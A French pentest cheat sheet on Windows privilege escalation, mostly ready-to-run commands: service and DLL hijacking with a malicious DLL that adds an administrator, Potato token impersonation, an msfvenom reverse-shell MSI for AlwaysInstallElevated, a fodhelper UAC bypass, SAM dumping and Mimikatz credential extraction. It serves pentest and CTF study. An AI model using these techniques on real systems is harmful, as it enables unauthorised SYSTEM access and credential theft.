---
title: Windows Privilege Escalation
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [privilege-escalation, windows, privesc, pentest, ctf, sécurité]
date: 2026-03-22
---

# Windows Privilege Escalation

L'escalade de privilèges Windows vise à passer d'un compte utilisateur ou service standard vers SYSTEM (équivalent root), en exploitant des mauvaises configurations, des services vulnérables ou des mécanismes Windows mal sécurisés.

## Énumération initiale

```powershell
# Identité et droits
whoami
whoami /priv                    # Privileges de l'utilisateur
whoami /groups                  # Groupes d'appartenance
net user                        # Utilisateurs locaux
net localgroup administrators   # Membres du groupe Admins

# Système
systeminfo                      # Version OS, hotfixes installés
wmic os get Caption,Version,BuildNumber
wmic qfe list brief             # Liste des patches installés
wmic logicaldisk get Caption    # Disques

# Réseau
ipconfig /all
netstat -ano                    # Connexions et ports ouverts
route print
```

## Services vulnérables

### Unquoted Service Paths

Si le chemin d'un service contient des espaces et n'est pas entre guillemets, Windows cherche le binaire à chaque espace.

```
Chemin vulnérable :
C:\Program Files\My Service\myservice.exe

Windows cherche dans cet ordre :
C:\Program.exe                        ← Si on peut créer ce fichier
C:\Program Files\My.exe               ← Si on peut créer ce fichier
C:\Program Files\My Service\myservice.exe  ← Binaire légitime

→ Si on a les droits d'écriture dans C:\ → placer C:\Program.exe
→ Au prochain démarrage du service → exécution de notre binaire en SYSTEM
```

```powershell
# Trouver les services avec chemins non quotés
wmic service get name,displayname,pathname,startmode |
  findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '\"'

# Vérifier les droits sur les répertoires
icacls "C:\Program Files\Vulnerable Service"
# BUILTIN\Users : (W) → tout le monde peut écrire → exploitable
```

### Permissions de service mal configurées

```powershell
# Vérifier les permissions sur les services
# accesschk.exe (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv [ServiceName] /accepteula

# Si SERVICE_ALL_ACCESS ou SERVICE_CHANGE_CONFIG → modifier le binaire path
sc config [VulnerableService] binpath= "C:\Temp\shell.exe"
sc stop [VulnerableService]
sc start [VulnerableService]
```

### DLL Hijacking

Windows cherche les DLL dans un ordre précis. Si un répertoire prioritaire est modifiable, on peut y placer une DLL malveillante.

```
Ordre de recherche DLL (SafeDllSearchMode activé) :
1. Répertoire de l'application
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Répertoire courant
6. Répertoires dans PATH

Si le répertoire de l'application est modifiable et qu'une DLL est manquante :
→ Placer notre DLL dans ce répertoire → exécutée avec les droits du service
```

```c
// DLL malveillante — shell.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

```powershell
# Détecter les DLL manquantes avec Procmon (Sysinternals)
# Filtre : Result = "NAME NOT FOUND" + Path ends with .dll
# + Process = service cible

# Ou avec PowerSploit
Find-ProcessDLLHijack
Find-PathDLLHijack
```

## Token Impersonation et SeImpersonatePrivilege

Si l'utilisateur possède le privilege `SeImpersonatePrivilege` (comptes de service IIS, SQL Server), il peut usurper l'identité d'un token SYSTEM.

```powershell
# Vérifier les privileges
whoami /priv
# SeImpersonatePrivilege        Enabled → vulnérable

# Outils d'exploitation
# PrintSpoofer (Windows 10 / Server 2019)
.\PrintSpoofer.exe -i -c cmd
# → shell SYSTEM

# GodPotato (toutes versions Windows récentes)
.\GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (Windows < 1809)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# RoguePotato
.\RoguePotato.exe -r 192.168.1.10 -e "cmd.exe" -l 9999
```

## Registre Windows

```powershell
# AlwaysInstallElevated — MSI s'installent avec droits SYSTEM si activé
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Si les deux valeurs = 1 → exploitable

# Générer un MSI malveillant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi   # Installation silencieuse avec droits SYSTEM

# Credentials dans le registre (AutoLogon)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Chercher : DefaultUserName, DefaultPassword

# Credentials SAVegardés
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s   # Sessions PuTTY
reg query "HKLM\Software\ORL\WinVNC3\Password"              # VNC
```

## UAC Bypass

L'UAC (User Account Control) demande une confirmation avant d'exécuter des actions à hauts privilèges. Certaines techniques le contournent sans fenêtre de dialogue.

```powershell
# Vérifier le niveau UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = elevation automatique sans prompt (bypassable)
# 2 = toujours demander (plus sécurisé)

# UAC Bypass via fodhelper.exe (Windows 10)
# fodhelper lit HKCU\Software\Classes\ms-settings\Shell\Open\command
# et exécute la commande en élevé

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(default)" -Value "cmd /c start C:\Users\user\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# Nettoyage
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# UAC Bypass via eventvwr.exe (similaire)
# eventvwr cherche HKCU\Software\Classes\mscfile\Shell\Open\command
```

## Credentials dans les fichiers et mémoire

```powershell
# Fichiers de configuration
findstr /si password *.xml *.ini *.txt *.config 2>nul
findstr /si password C:\inetpub\wwwroot\*.config 2>nul
type C:\Windows\Panther\Unattend.xml    # Config d'installation non-interactive
type C:\Windows\Panther\Unattended.xml
type C:\sysprep\sysprep.xml             # Sysprep credentials

# SAM et SYSTEM (si accessible)
# La base SAM contient les hashes NTLM des utilisateurs locaux
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
# Transférer sur Kali et extraire :
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Credential Manager
cmdkey /list                            # Credentials sauvegardés
# Si un credential admin est présent :
runas /savecred /user:DOMAIN\Administrator "cmd.exe"

# LSASS Memory dump (nécessite admin ou SeDebugPrivilege)
# Mimikatz
privilege::debug
sekurlsa::logonpasswords   # Extraire les credentials en clair de la mémoire
```

## Outils automatiques

```powershell
# WinPEAS — le plus complet
.\winPEAS.exe

# PowerUp (PowerSploit)
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (énumération de sécurité)
.\Seatbelt.exe -group=all

# BeRoot
.\beroot.exe

# Sherlock (exploits kernel Windows)
. .\Sherlock.ps1
Find-AllVulns
```

## Récapitulatif par priorité

| Vecteur | Condition | Outil |
|---|---|---|
| SeImpersonatePrivilege | Compte de service | PrintSpoofer, GodPotato |
| AlwaysInstallElevated | Registre configuré | MSI malveillant |
| Unquoted service path | Chemin avec espaces | sc config |
| DLL hijacking | DLL manquante dans répertoire modifiable | DLL custom |
| Credentials en clair | Fichiers de config, registre | findstr, reg query |
| SAM dump | Accès aux fichiers SAM | impacket-secretsdump |
| UAC bypass | Niveau UAC 0 ou 2 | fodhelper, eventvwr |
| Kernel exploit | Version vulnérable | EternalBlue, PrintNightmare |
